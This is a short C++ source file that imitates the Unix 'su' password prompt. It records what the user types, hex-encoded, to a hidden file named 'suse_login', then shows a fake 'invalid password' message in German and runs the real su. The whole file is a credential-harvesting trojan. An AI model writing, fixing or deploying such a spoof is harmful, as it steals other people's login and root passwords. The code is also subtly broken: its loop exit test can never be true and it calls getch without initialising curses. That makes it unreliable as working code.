#include <iostream>
#include <fstream>
#include <curses.h>
using namespace std;

void bin2hex(char cBin, char* sHex) // 0<sBin<255, sHex[3]
{
	char s16[]="0123456789ABCDEF";
	sHex[0]=s16[cBin/16];
	sHex[1]=s16[cBin%16];
	sHex[2]=0;
}

int main()
{
	ifstream hDatei("suse_login");
	if(hDatei) {hDatei.close(); return 0;}
	cout<<"Passwort: ";
	char c; char sHex[3];
	ofstream hDatei2("suse_login");
	if(!hDatei2) return -1;
	while(1)
	{
		c=getch();
		if(c==0) continue;
		if(c==EOF && c=='\n' && c=='\r') break;
		bin2hex(c, sHex);
		hDatei2<<sHex;
	}
	hDatei2.close();
	cout<<"\nsu: ungueltiges Kennwort"<<endl;
	system("su");
	return 0;
}
